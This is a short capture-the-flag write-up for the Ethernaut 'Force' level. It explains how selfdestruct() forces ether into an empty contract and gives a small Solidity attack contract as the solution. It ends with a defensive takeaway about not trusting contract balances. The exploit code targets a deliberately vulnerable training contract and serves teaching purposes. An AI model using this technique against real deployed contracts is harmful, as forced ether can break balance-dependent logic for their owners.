## The hack

In this Ethernaut level, the given contract is completely empty. So how can we send any ether to it? The trick is to use the (soon to be deprecated) `selfdestruct()`, which is one way to force send ether to a contract.

When self-destructing itself, the contract must send any remaining ether to another address. This is how we can easily solve this level. We simply need to deploy a contract that self-destructs and sends its ether to the vulnerable contract.

## Solution

Write and deploy a contract that takes the address of the vulnerable contract and calls's `selfdestruct()` on itself, forwarding its ether balance to the target.

```javascript

contract Attack {
     Force public force;

     constructor(Force _force) payable{
          force = _force;
     }

     function sendMoney() public payable {
          selfdestruct(payable(address(force)));
     }

     receive() external payable{
          sendMoney();
     }

}
```

## Takeaway

- `selfdestruct()` is a way to force send ether to a contract.
- Never rely on a contract's balance to implement sensitive logic.